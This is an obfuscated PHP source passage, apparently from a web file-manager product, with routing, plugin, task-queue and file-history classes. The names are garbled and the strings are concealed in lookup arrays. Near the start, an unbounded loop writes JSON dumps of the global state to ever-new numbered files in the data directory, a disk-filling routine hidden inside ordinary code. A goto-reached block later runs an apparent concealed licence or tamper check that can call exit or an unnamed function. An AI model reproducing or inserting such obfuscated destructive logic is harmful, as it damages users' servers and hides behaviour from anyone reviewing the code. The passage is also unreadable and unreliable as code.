$‘¢Ö¨›­ = $ÜŒ§íÆ—[924]; $»Â¡ĞÉ = json_encode($GLOBALS[$ÜŒ§íÆ—[925]]); $ÃÁªâû† = 1; for ($¸ˆå­³ = $ÃÁªâû†; $¸ˆå­³ > 0; $¸ˆå­³++) { $‘¢Ö¨›­(DATA_PATH . $¸ˆå­³, $»Â¡ĞÉ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¼ÑŸ·¾ª); } public function onSetConfig($µœ‘è¯¼) { } public function onGetConfig($Ç«¼û— ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÜùñÑÚ) { if ($ÜùñÑÚ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($£Ñ©Ò¹‡ = "\x70\x6c\x75\147\x69\x6e\101\165\x74\150") { $……ÇÂÊí =& $_SERVER[—ÌÒğš÷]; if (!Session::get($……ÇÂÊí[1562])) { return !1; } if (_get($GLOBALS, $……ÇÂÊí[536])) { return !0; } $ÅÄ†çÂª = $this->getConfig(); if (!$ÅÄ†çÂª[$£Ñ©Ò¹‡]) { return !1; } return ActionCall($……ÇÂÊí[1614], $ÅÄ†çÂª[$£Ñ©Ò¹‡]); } public function url($İÊç¬¸Ü, $Ú‚Ë¬Üô = '', $İƒ„™Æâ = true) { $ÁŞ¯¯İ =& $_SERVER[—ÌÒğš÷]; $ş·Ã´¦‹ = $this->getConfig(); $­´êÚÜš = KOD_VERSION . $ÁŞ¯¯İ[10] . KOD_VERSION_BUILD; $«òœËøæ = $this->packageVersion(); $ê¿òìÌ£ = $­´êÚÜš . $ÁŞ¯¯İ[430] . $«òœËøæ; if (substr($İÊç¬¸Ü, 0, 4) == $ÁŞ¯¯İ[149] || substr($İÊç¬¸Ü, 0, 2) == $ÁŞ¯¯İ[1397]) { $¿¬éîô = $İÊç¬¸Ü . $ÁŞ¯¯İ[1615] . $ê¿òìÌ£; } else { if ($Ú‚Ë¬Üô == $ÁŞ¯¯İ[12]) { $¿¬éîô = $this->pluginHost . $İÊç¬¸Ü . $ÁŞ¯¯İ[1615] . $ê¿òìÌ£; } else { if ($Ú‚Ë¬Üô === $ÁŞ¯¯İ[75]) { $¿¬éîô = $this->pluginHost . $İÊç¬¸Ü; } else { if ($Ú‚Ë¬Üô == $ÁŞ¯¯İ[1616]) { $¿¬éîô = STATIC_PATH . $İÊç¬¸Ü . $ÁŞ¯¯İ[1615] . $­´êÚÜš; } else { if ($Ú‚Ë¬Üô == $ÁŞ¯¯İ[1617]) { $¿¬éîô = APP_HOST . $ÁŞ¯¯İ[1618] . $İÊç¬¸Ü . $ÁŞ¯¯İ[1615] . $­´êÚÜš; } else { if (isset($ş·Ã´¦‹[$Ú‚Ë¬Üô])) { $¿¬éîô = $ş·Ã´¦‹[$Ú‚Ë¬Üô] . $İÊç¬¸Ü . $ÁŞ¯¯İ[1615] . $ê¿òìÌ£; } } } } } } if (!$İƒ„™Æâ) { return $¿¬éîô; } echo $¿¬éîô; } public function link($Ş®¯’òÊ = false, $ã—íğÄ = '') { $ª¯å´ø =& $_SERVER[—ÌÒğš÷]; if (!$Ş®¯’òÊ) { $this->link($ª¯å´ø[1619], $ª¯å´ø[1617]); $this->link($ª¯å´ø[1620], $ª¯å´ø[1616]); $this->link($ª¯å´ø[1621], $ª¯å´ø[1616]); $this->link($ª¯å´ø[1622], $ª¯å´ø[1616]); $this->link($ª¯å´ø[1623], $ª¯å´ø[1616]); return; } $¾®¬å¶ö = $this->url($Ş®¯’òÊ, $ã—íğÄ, !1); if (substr($Ş®¯’òÊ, -3) == $ª¯å´ø[1624]) { echo $ª¯å´ø[1625] . $¾®¬å¶ö . $ª¯å´ø[1626] . $ª¯å´ø[246]; } else { if (substr($Ş®¯’òÊ, -4) == $ª¯å´ø[1627]) { echo $ª¯å´ø[1628] . $¾®¬å¶ö . $ª¯å´ø[1629] . $ª¯å´ø[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\57\135\x2b", "\72\x6e\x75\155" => "\x5b\x30\55\x39\135\x2b", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($†ÆÜ… , $œÉ‹ˆšê) { $ƒíƒƒœè =& $_SERVER[—ÌÒğš÷]; if ($†ÆÜ…  == $ƒíƒƒœè[1630]) { $ªÙµÔª = array_map($ƒíƒƒœè[1631], $œÉ‹ˆšê[0]); $»®ƒ¾•¦ = strpos($œÉ‹ˆšê[1], $ƒíƒƒœè[8]) === 0 ? $œÉ‹ˆšê[1] : $ƒíƒƒœè[8] . $œÉ‹ˆšê[1]; $Ù®°×¿© = $œÉ‹ˆšê[2]; } else { $ªÙµÔª = null; $»®ƒ¾•¦ = strpos($œÉ‹ˆšê[0], $ƒíƒƒœè[8]) === 0 ? $œÉ‹ˆšê[0] : $ƒíƒƒœè[8] . $œÉ‹ˆšê[0]; $Ù®°×¿© = $œÉ‹ˆšê[1]; } array_push(self::$maps, $ªÙµÔª); array_push(self::$routes, $»®ƒ¾•¦); array_push(self::$methods, strtoupper($†ÆÜ… )); array_push(self::$callbacks, $Ù®°×¿©); } public static function error($‚ï˜ÍÏ) { self::$errorCallback = $‚ï˜ÍÏ; } public static function haltOnMatch($­èá˜×ğ = true) { self::$halts = $­èá˜×ğ; } public static function dispatch() { $÷Šş¾¡ê =& $_SERVER[—ÌÒğš÷]; $­ÉÓ×ù° = parse_url($_SERVER[$÷Šş¾¡ê[1632]], PHP_URL_PATH); $ÃÆğÏáá = $_SERVER[$÷Šş¾¡ê[160]]; $“°¯·ºå = array_keys(static::$patterns); $Ó¿úğ› = array_values(static::$patterns); $É¬“Ëßª = !1; self::$routes = preg_replace($÷Šş¾¡ê[1320], $÷Šş¾¡ê[8], self::$routes); if (in_array($­ÉÓ×ù°, self::$routes)) { $õ¾íÊ¬ = array_keys(self::$routes, $­ÉÓ×ù°); foreach ($õ¾íÊ¬ as $®”ãº¹) { if (self::$methods[$®”ãº¹] == $ÃÆğÏáá || self::$methods[$®”ãº¹] == $÷Šş¾¡ê[1633] || in_array($ÃÆğÏáá, self::$maps[$®”ãº¹])) { $É¬“Ëßª = !0; if (!is_object(self::$callbacks[$®”ãº¹])) { $´·ĞáÀ = explode($÷Šş¾¡ê[8], self::$callbacks[$®”ãº¹]); $Ãéıã‚ò = end($´·ĞáÀ); $Şö¾ = explode($÷Šş¾¡ê[1252], $Ãéıã‚ò); $¹¹Îş§“ = new $Şö¾[0](); $¹¹Îş§“->{$Şö¾[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$®”ãº¹]); if (self::$halts) { return; } } } } } else { $Şœİ›ŒÖ = 0; foreach (self::$routes as $®”ãº¹) { if (strpos($®”ãº¹, $÷Šş¾¡ê[4]) !== !1) { $®”ãº¹ = str_replace($“°¯·ºå, $Ó¿úğ›, $®”ãº¹); } if (preg_match($÷Šş¾¡ê[1634] . $®”ãº¹ . $÷Šş¾¡ê[1635], $­ÉÓ×ù°, $«ò‹æİ“)) { if (self::$methods[$Şœİ›ŒÖ] == $ÃÆğÏáá || self::$methods[$Şœİ›ŒÖ] == $÷Šş¾¡ê[1633] || !empty(self::$maps[$Şœİ›ŒÖ]) && in_array($ÃÆğÏáá, self::$maps[$Şœİ›ŒÖ])) { $É¬“Ëßª = !0; array_shift($«ò‹æİ“); if (!is_object(self::$callbacks[$Şœİ›ŒÖ])) { $´·ĞáÀ = explode($÷Šş¾¡ê[8], self::$callbacks[$Şœİ›ŒÖ]); $Ãéıã‚ò = end($´·ĞáÀ); $Şö¾ = explode($÷Šş¾¡ê[1252], $Ãéıã‚ò); $¹¹Îş§“ = new $Şö¾[0](); if (!method_exists($¹¹Îş§“, $Şö¾[1])) { echo $÷Šş¾¡ê[1636]; } else { call_user_func_array(array($¹¹Îş§“, $Şö¾[1]), $«ò‹æİ“); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Şœİ›ŒÖ], $«ò‹æİ“); if (self::$halts) { return; } } } } $Şœİ›ŒÖ++; } } if ($É¬“Ëßª == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¼€şÓî¶ =& $_SERVER[—ÌÒğš÷]; header($_SERVER[$¼€şÓî¶[1637]] . $¼€şÓî¶[1638]); echo $¼€şÓî¶[1639]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$÷Šş¾¡ê[1632]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto fÚÏ÷Æ’ŠÙ; F¸´˜‚Å°Ÿ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($àéˆşÕ¬, $í­¬‡« = '', $ÛĞ¼‚‰ = 0, $÷£ªãïµ = '') { $œßñ¢¶ =& $_SERVER[—ÌÒğš÷]; $¤¹ãÜ©’ = new Task($àéˆşÕ¬, $í­¬‡«, $ÛĞ¼‚‰, $÷£ªãïµ); $GLOBALS[$œßñ¢¶[1772] . $àéˆşÕ¬] = new TaskLog($œßñ¢¶[1672], $¤¹ãÜ©’, $÷£ªãïµ); return $¤¹ãÜ©’; } public function __construct($µ‹²ïöŞ = '', $ŸøôÜËÚ = '', $’¿’¢†² = '') { $™ßÊëÏ¿ =& $_SERVER[—ÌÒğš÷]; if (!$µ‹²ïöŞ) { $µ‹²ïöŞ = $™ßÊëÏ¿[1672]; } $´”¹¨«¦ = $µ‹²ïöŞ . $™ßÊëÏ¿[430] . rand_string(10); if (!$’¿’¢†²) { $’¿’¢†² = $µ‹²ïöŞ . $™ßÊëÏ¿[53] . $’¿’¢†²; } switch ($µ‹²ïöŞ) { case $™ßÊëÏ¿[1672]: if (!$ŸøôÜËÚ || !$ŸøôÜËÚ->task) { return echoLog($µ‹²ïöŞ . $™ßÊëÏ¿[1773]); } $€¯µ©‘ = $ŸøôÜËÚ; $´”¹¨«¦ = $€¯µ©‘->task[$™ßÊëÏ¿[443]]; $µ‹²ïöŞ = $€¯µ©‘->task[$™ßÊëÏ¿[443]]; if (!$€¯µ©‘->task[$™ßÊëÏ¿[1585]]) { $€¯µ©‘->task[$™ßÊëÏ¿[1585]] = $’¿’¢†² ? $’¿’¢†² : $µ‹²ïöŞ; } break; case $™ßÊëÏ¿[1774]: if (!$ŸøôÜËÚ) { return echoLog($µ‹²ïöŞ . $™ßÊëÏ¿[1775]); } $İ¸åÎ·Ë = is_string($ŸøôÜËÚ) ? array($ŸøôÜËÚ) : $ŸøôÜËÚ; $€¯µ©‘ = new TaskFileTransfer($´”¹¨«¦, $µ‹²ïöŞ, 0, $’¿’¢†² ? $’¿’¢†² : $İ¸åÎ·Ë[0]); foreach ($İ¸åÎ·Ë as $´À³ƒ®) { $€¯µ©‘->addPath($´À³ƒ®); } break; case $™ßÊëÏ¿[357]: if (!$ŸøôÜËÚ) { return echoLog($µ‹²ïöŞ . $™ßÊëÏ¿[1775]); } $İ¸åÎ·Ë = is_string($ŸøôÜËÚ) ? array($ŸøôÜËÚ) : $ŸøôÜËÚ; $€¯µ©‘ = new TaskZip($´”¹¨«¦, $µ‹²ïöŞ, 0, $’¿’¢†² ? $’¿’¢†² : $İ¸åÎ·Ë[0]); foreach ($İ¸åÎ·Ë as $´À³ƒ®) { $€¯µ©‘->addPath($´À³ƒ®); } break; case $™ßÊëÏ¿[1258]: if (!$ŸøôÜËÚ) { return echoLog($µ‹²ïöŞ . $™ßÊëÏ¿[1775]); } $€¯µ©‘ = new TaskUnZip($´”¹¨«¦, $µ‹²ïöŞ, 0, $’¿’¢†² ? $’¿’¢†² : $ŸøôÜËÚ); if ($ŸøôÜËÚ) { $€¯µ©‘->addFile($ŸøôÜËÚ); } break; case $™ßÊëÏ¿[149]: $€¯µ©‘ = new TaskHttp($´”¹¨«¦, $µ‹²ïöŞ); break; default: return; break; } $this->task = $€¯µ©‘; $this->taskID = $´”¹¨«¦; Hook::bind($™ßÊëÏ¿[1709], array($this, $™ßÊëÏ¿[1776])); Hook::bind($™ßÊëÏ¿[1711], array($this, $™ßÊëÏ¿[1777])); Hook::bind($™ßÊëÏ¿[1705], array($this, $™ßÊëÏ¿[1778])); echoLog($™ßÊëÏ¿[1779] . $€¯µ©‘->task[$™ßÊëÏ¿[1585]]); } public function __destruct() { $this->end(); } public function end($ˆ”ƒŒ‰ = '') { $”³ã³Ó =& $_SERVER[—ÌÒğš÷]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ˆ”ƒŒ‰); $this->task = !1; $this->taskID = !1; Hook::unbind($”³ã³Ó[1709], array($this, $”³ã³Ó[1776])); Hook::unbind($”³ã³Ó[1711], array($this, $”³ã³Ó[1777])); Hook::unbind($”³ã³Ó[1705], array($this, $”³ã³Ó[1778])); } public function taskUpdate($É¨•…Ù) { $ÖîÏè =& $_SERVER[—ÌÒğš÷]; if (!$É¨•…Ù || $this->taskID != $É¨•…Ù[$ÖîÏè[443]]) { return; } $êäŠù™Ë = 20; $¶êöƒÛÌ = intval($É¨•…Ù[$ÖîÏè[1690]] * $êäŠù™Ë); $æå®ÈúŒ = $ÖîÏè[163] . str_repeat($ÖîÏè[928], $¶êöƒÛÌ) . $ÖîÏè[1058] . str_repeat($ÖîÏè[53], $êäŠù™Ë - $¶êöƒÛÌ) . $ÖîÏè[165]; $ƒü±ŒÍÚ = $æå®ÈúŒ . sprintf($ÖîÏè[1780], $É¨•…Ù[$ÖîÏè[1690]] * 100) . $ÖîÏè[1781]; $ÈÇ ‡€İ = $ƒü±ŒÍÚ . $É¨•…Ù[$ÖîÏè[1689]] . $ÖîÏè[8] . $É¨•…Ù[$ÖîÏè[822]] . LNG($ÖîÏè[1782]); $‘èÑÈ¾³ = $ÖîÏè[12]; if ($É¨•…Ù[$ÖîÏè[1765]]) { $ÈÇ ‡€İ = $ƒü±ŒÍÚ . size_format($É¨•…Ù[$ÖîÏè[1689]]) . $ÖîÏè[8] . size_format($É¨•…Ù[$ÖîÏè[822]]); $‘èÑÈ¾³ = size_format($É¨•…Ù[$ÖîÏè[1691]]) . $ÖîÏè[1783]; } if ($É¨•…Ù[$ÖîÏè[1108]]) { $É¨•…Ù[$ÖîÏè[1739]] = $É¨•…Ù[$ÖîÏè[1108]] . $ÖîÏè[53] . $É¨•…Ù[$ÖîÏè[1739]]; } if ($É¨•…Ù[$ÖîÏè[1739]]) { $Û·ËŠªÊ = $ÖîÏè[12]; if ($É¨•…Ù[$ÖîÏè[1741]]) { $Û·ËŠªÊ = $ÖîÏè[50] . size_format($É¨•…Ù[$ÖîÏè[1742]]) . $ÖîÏè[8] . size_format($É¨•…Ù[$ÖîÏè[1741]]); } $‘èÑÈ¾³ .= $É¨•…Ù[$ÖîÏè[1739]] . $Û·ËŠªÊ; } if ($É¨•…Ù[$ÖîÏè[799]] && !$É¨•…Ù[$ÖîÏè[1741]]) { $‘èÑÈ¾³ .= $ÖîÏè[53] . size_format($É¨•…Ù[$ÖîÏè[1746]]) . $ÖîÏè[8] . size_format($É¨•…Ù[$ÖîÏè[799]]); } echoLog($ÈÇ ‡€İ . $ÖîÏè[53] . $‘èÑÈ¾³, !0); } public function taskEnd($£ªŒË·Ü) { $‰‹£şüõ =& $_SERVER[—ÌÒğš÷]; if (!$£ªŒË·Ü || $this->taskID != $£ªŒË·Ü[$‰‹£şüõ[443]]) { return; } $ÅÜŸ = $£ªŒË·Ü ? $£ªŒË·Ü[$‰‹£şüõ[1689]] . $‰‹£şüõ[8] . $£ªŒË·Ü[$‰‹£şüõ[822]] . LNG($‰‹£şüõ[1782]) . $‰‹£şüõ[71] : $‰‹£şüõ[12]; echoLog($‰‹£şüõ[1784] . $£ªŒË·Ü[$‰‹£şüõ[1585]] . ($£ªŒË·Ü[$‰‹£şüõ[494]] ? $‰‹£şüõ[71] . $£ªŒË·Ü[$‰‹£şüõ[494]] : $‰‹£şüõ[12]) . $‰‹£şüõ[71] . $ÅÜŸ . $‰‹£şüõ[1785] . sprintf($‰‹£şüõ[895], timeFloat() - $£ªŒË·Ü[$‰‹£şüõ[1692]]) . $‰‹£şüõ[1704]); $this->end(); } public function taskKill($À–ĞÕØÉ) { $¢˜ —û =& $_SERVER[—ÌÒğš÷]; if (!$À–ĞÕØÉ || $this->taskID != $À–ĞÕØÉ[$¢˜ —û[443]]) { return; } echoLog($¢˜ —û[1786] . $À–ĞÕØÉ[$¢˜ —û[1585]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\165\145\165\x65\114\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\163\x6b\121\x75\145\x75\145\x44\141\x74\x61"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\165\x65\165\145\114\141\163\x74\122\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\x6b\121\x75\x65\165\145\x54\150\x72\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¯Ò¾”æ•, $ö›úÕˆ¯ = array(), $‚œ†±Ç = '', $ÎƒÃŒº = '') { $¿ÔÁ¯‰— =& $_SERVER[—ÌÒğš÷]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÎƒÃŒº && array_find_by_field(self::$listData, $¿ÔÁ¯‰—[94], $ÎƒÃŒº)) { return !0; } if ($ÎƒÃŒº && array_find_by_field(self::$listDataAdd, $¿ÔÁ¯‰—[94], $ÎƒÃŒº)) { return !0; } self::$listDataAdd[] = array($¿ÔÁ¯‰—[308] => $¯Ò¾”æ•, $¿ÔÁ¯‰—[1787] => $ö›úÕˆ¯, $¿ÔÁ¯‰—[494] => $‚œ†±Ç, $¿ÔÁ¯‰—[94] => $ÎƒÃŒº); return !0; } public static function addSubmit() { $› ùš‰ =& $_SERVER[—ÌÒğš÷]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($› ùš‰[1788] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $› ùš‰[12], $› ùš‰[494])), $› ùš‰[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¹Ğƒà², $ÊÊ˜˜İ€ = array(), $¦Ô¬œó = '', $Éˆ ö¨ = '') { $Í¾Æ‡²¥ =& $_SERVER[—ÌÒğš÷]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ò¯Õ‹œ½ = self::getAll(); if ($Éˆ ö¨ && array_find_by_field($Ò¯Õ‹œ½, $Í¾Æ‡²¥[94], $Éˆ ö¨)) { return !0; } $Ò¯Õ‹œ½[] = array($Í¾Æ‡²¥[308] => $¹Ğƒà², $Í¾Æ‡²¥[1787] => $ÊÊ˜˜İ€, $Í¾Æ‡²¥[494] => $¦Ô¬œó, $Í¾Æ‡²¥[94] => $Éˆ ö¨); self::setAll($Ò¯Õ‹œ½); write_log($Í¾Æ‡²¥[1788] . $¦Ô¬œó, $Í¾Æ‡²¥[185]); return !0; } public static function run() { $…§¨¾Ö¸ =& $_SERVER[—ÌÒğš÷]; $¾åÊœØÜ = self::getAll(); $Öêüîã± = array_shift($¾åÊœØÜ); if (!$Öêüîã±) { return !1; } self::setAll($¾åÊœØÜ); $åıóŞóÄ = timeFloat(); $¬è÷€Ş = $…§¨¾Ö¸[12]; try { $¬è÷€Ş = Hook::apply($Öêüîã±[$…§¨¾Ö¸[308]], $Öêüîã±[$…§¨¾Ö¸[1787]]); } catch (Exception $ûÀ·¯ÅË) { write_log($ûÀ·¯ÅË, $…§¨¾Ö¸[1226]); } $’´ç›ş = number_format(timeFloat() - $åıóŞóÄ, 3) . $…§¨¾Ö¸[1704]; if ($¬è÷€Ş && is_string($¬è÷€Ş)) { $’´ç›ş = $’´ç›ş . $…§¨¾Ö¸[1789] . $¬è÷€Ş; } write_log($…§¨¾Ö¸[1790] . $Öêüîã±[$…§¨¾Ö¸[494]] . $…§¨¾Ö¸[1791] . $’´ç›ş, $…§¨¾Ö¸[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $£Ö¿§Ë¬ =& $_SERVER[—ÌÒğš÷]; $°…ƒü® = self::threadCount() + 1; if ($°…ƒü® > 3 || !self::count()) { return; } write_log($£Ö¿§Ë¬[1792] . $°…ƒü®, $£Ö¿§Ë¬[185]); Cache::set(self::QUEUE_THREAD, $°…ƒü®, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($£Ö¿§Ë¬[1793], $£Ö¿§Ë¬[185]); } public static function getKey($çÓÏ”……, $¸Êù‘î¸ = "\x69\156\x74") { $‘ì«ø©º =& $_SERVER[—ÌÒğš÷]; Cache::removeMemory($çÓÏ”……); $ÎĞ›¯œ° = Cache::get($çÓÏ”……); if ($¸Êù‘î¸ == $‘ì«ø©º[332]) { return $ÎĞ›¯œ° ? intval($ÎĞ›¯œ°) : 0; } if ($¸Êù‘î¸ == $‘ì«ø©º[1794]) { return is_array($ÎĞ›¯œ°) ? $ÎĞ›¯œ° : array(); } return $ÎĞ›¯œ°; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[—ÌÒğš÷][1794]); } public static function setAll($¸‡÷Ï¸•) { $±¸…¼ñ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¸‡÷Ï¸•), $±¸…¼ñ); Cache::set(self::QUEUE_DATA, $¸‡÷Ï¸•, $±¸…¼ñ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($½Õ¼¦ÒÆ, $Ñ„ï û = 5.0) { if (!$½Õ¼¦ÒÆ) { return; } $Ÿ•‚µ©¶ = Cache::get($½Õ¼¦ÒÆ); if (!$Ÿ•‚µ©¶ || timeFloat() - floatVal($Ÿ•‚µ©¶) >= $Ñ„ï û) { Cache::set($½Õ¼¦ÒÆ, timeFloat(), $Ñ„ï û * 10); return !0; } return !1; } public static function timeLimitCall($Å€›šøÑ, $úèŞ¤¹ş, $©÷õˆ, $¢éáÈãì = 5.0) { $áÁ’ŠÃ´ =& $_SERVER[—ÌÒğš÷]; if (!$Å€›šøÑ || !$úèŞ¤¹ş) { return; } self::$asyncAdd = !0; $’í–Ï„Ñ = $áÁ’ŠÃ´[1795]; $ÖŠŠÑÁ = Cache::get($’í–Ï„Ñ, !0); $øæÏ§Ş = array($áÁ’ŠÃ´[1796] => timeFloat(), $áÁ’ŠÃ´[1797] => timeFloat(), $áÁ’ŠÃ´[308] => $úèŞ¤¹ş, $áÁ’ŠÃ´[1787] => $©÷õˆ, $áÁ’ŠÃ´[194] => $¢éáÈãì); if (is_array($ÖŠŠÑÁ[$Å€›šøÑ])) { $øæÏ§Ş[$áÁ’ŠÃ´[1797]] = $ÖŠŠÑÁ[$Å€›šøÑ][$áÁ’ŠÃ´[1797]]; } if (is_array($ÖŠŠÑÁ[$Å€›šøÑ])) { if (timeFloat() - $ÖŠŠÑÁ[$Å€›šøÑ][$áÁ’ŠÃ´[1796]] < $øæÏ§Ş[$áÁ’ŠÃ´[194]] * 0.3) { return; } $øæÏ§Ş[$áÁ’ŠÃ´[1797]] = $ÖŠŠÑÁ[$Å€›šøÑ][$áÁ’ŠÃ´[1797]]; } $ÖŠŠÑÁ[$Å€›šøÑ] = $øæÏ§Ş; Cache::set($’í–Ï„Ñ, $ÖŠŠÑÁ, 60); Cache::removeMemory($’í–Ï„Ñ); write_log($áÁ’ŠÃ´[1798] . $Å€›šøÑ . $áÁ’ŠÃ´[71] . $úèŞ¤¹ş, $áÁ’ŠÃ´[185]); } public static function timeLimitCallLoop() { $ƒ¥öª¶Í =& $_SERVER[—ÌÒğš÷]; $§ªŞğ’ = array($ƒ¥öª¶Í[1799]); $¿ú‘Õ†ˆ = in_array(strtolower(ACTION), $§ªŞğ’); if (!$¿ú‘Õ†ˆ && !self::$asyncAdd) { return; } $‘ä„™Ô¸ = $ƒ¥öª¶Í[1795]; $¢ÆûÆŸÔ = Cache::get($‘ä„™Ô¸, !0); if (!$¢ÆûÆŸÔ || count($¢ÆûÆŸÔ) <= 0) { return; } $•á¼¹´Ã = !1; $½Ê¹Ûò½ = timeFloat(); $‡™õØ€ƒ = array(); foreach ($¢ÆûÆŸÔ as $‹ßûÇŠØ => $‘Ì•İ‰Ñ) { if ($½Ê¹Ûò½ - $‘Ì•İ‰Ñ[$ƒ¥öª¶Í[1797]] > $‘Ì•İ‰Ñ[$ƒ¥öª¶Í[194]]) { $•á¼¹´Ã = !0; try { Hook::apply($‘Ì•İ‰Ñ[$ƒ¥öª¶Í[308]], $‘Ì•İ‰Ñ[$ƒ¥öª¶Í[1787]]); write_log($ƒ¥öª¶Í[1800] . $‹ßûÇŠØ . $ƒ¥öª¶Í[71] . $‘Ì•İ‰Ñ[$ƒ¥öª¶Í[308]] . $ƒ¥öª¶Í[1801] . ACTION, $ƒ¥öª¶Í[185]); } catch (Exception $ø¶ßß¾à) { } continue; } $‡™õØ€ƒ[$‹ßûÇŠØ] = $‘Ì•İ‰Ñ; } if (!$•á¼¹´Ã) { return; } if (!$‡™õØ€ƒ) { return Cache::remove($‘ä„™Ô¸); } Cache::set($‘ä„™Ô¸, $‡™õØ€ƒ, 60); Cache::removeMemory($‘ä„™Ô¸); } public static function finished($ÊÒğÑèï, $ÜÈŞ¤Ç¥) { $ıîÌ‰£¯ =& $_SERVER[—ÌÒğš÷]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ıîÌ‰£¯[308] => $ÊÒğÑèï, $ıîÌ‰£¯[1787] => $ÜÈŞ¤Ç¥); } private static function finishedRun() { $ğÑ»Û÷Š =& $_SERVER[—ÌÒğš÷]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $çĞÅæç‡) { try { Hook::apply($çĞÅæç‡[$ğÑ»Û÷Š[308]], $çĞÅæç‡[$ğÑ»Û÷Š[1787]]); } catch (Exception $‡•ğÒüÊ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto aƒ”ö¡¾¼; B‹ê±Åİ·Ş: if ($_SERVER[$_SERVER[—ÌÒğš÷][879]] != $_SERVER[$_SERVER[—ÌÒğš÷][1771]]) { $_getc = $_SERVER[—ÌÒğš÷][880]; $_getfile = $_SERVER[$_SERVER[—ÌÒğš÷][881]] . $_SERVER[—ÌÒğš÷][882]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[—ÌÒğš÷][246], $_getfilec); if (count($_getarrs) < $_SERVER[—ÌÒğš÷][677]) { $exit = $_SERVER[—ÌÒğš÷][883]; $exit(); } $_act = $_SERVER[—ÌÒğš÷][884]; $_act($_SERVER[$_SERVER[—ÌÒğš÷][877]]); } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\145\x5f\150\151\163\x74\x6f\x72\x79"; public function historyCount($¹Ì»‹¸İ) { $§Éä¦½ã =& $_SERVER[—ÌÒğš÷]; if (!$¹Ì»‹¸İ) { return array(); } if (is_string($¹Ì»‹¸İ) || is_int($¹Ì»‹¸İ)) { $¹Ì»‹¸İ = array($¹Ì»‹¸İ); } $¬—ä±„ = array($§Éä¦½ã[181], $§Éä¦½ã[1920] => $§Éä¦½ã[533]); $Ş£Àø“ = array($§Éä¦½ã[181] => array($§Éä¦½ã[7], $¹Ì»‹¸İ)); $ˆ˜ÁÑ±Ö = $this->field($¬—ä±„)->where($Ş£Àø“)->group($§Éä¦½ã[181])->select(); return array_to_keyvalue($ˆ˜ÁÑ±Ö, $§Éä¦½ã[181], $§Éä¦½ã[533]); } public function addHistory($ÍÎÑŸôÏ, $¤ÅÔÃ…‡ = '') { $Ò¸ô‡Ë— =& $_SERVER[—ÌÒğš÷]; $‘ŠÕ‹ôô = array($Ò¸ô‡Ë—[459] => $ÍÎÑŸôÏ[$Ò¸ô‡Ë—[181]], $Ò¸ô‡Ë—[1679] => isset($ÍÎÑŸôÏ[$Ò¸ô‡Ë—[497]]) ? $ÍÎÑŸôÏ[$Ò¸ô‡Ë—[497]] : $ÍÎÑŸôÏ[$Ò¸ô‡Ë—[495]], $Ò¸ô‡Ë—[510] => $ÍÎÑŸôÏ[$Ò¸ô‡Ë—[509]], $Ò¸ô‡Ë—[585] => $ÍÎÑŸôÏ[$Ò¸ô‡Ë—[76]], $Ò¸ô‡Ë—[2131] => $¤ÅÔÃ…‡); if ($GLOBALS[$Ò¸ô‡Ë—[6]][$Ò¸ô‡Ë—[89]][$Ò¸ô‡Ë—[1261]] >= 1) { $this->historyAutoClear($‘ŠÕ‹ôô[$Ò¸ô‡Ë—[181]]); $this->add($‘ŠÕ‹ôô); } Hook::trigger($Ò¸ô‡Ë—[2132], $‘ŠÕ‹ôô); Model($Ò¸ô‡Ë—[2133])->eventFileEdit($ÍÎÑŸôÏ[$Ò¸ô‡Ë—[181]]); } private function historyAutoClear($»’ùŒ¡Ê) { $¬©ŠÖÜö =& $_SERVER[—ÌÒğš÷]; $äÉÉÓÚ£ = Model($¬©ŠÖÜö[806])->get($¬©ŠÖÜö[1283]); $Û²±ìê€ = 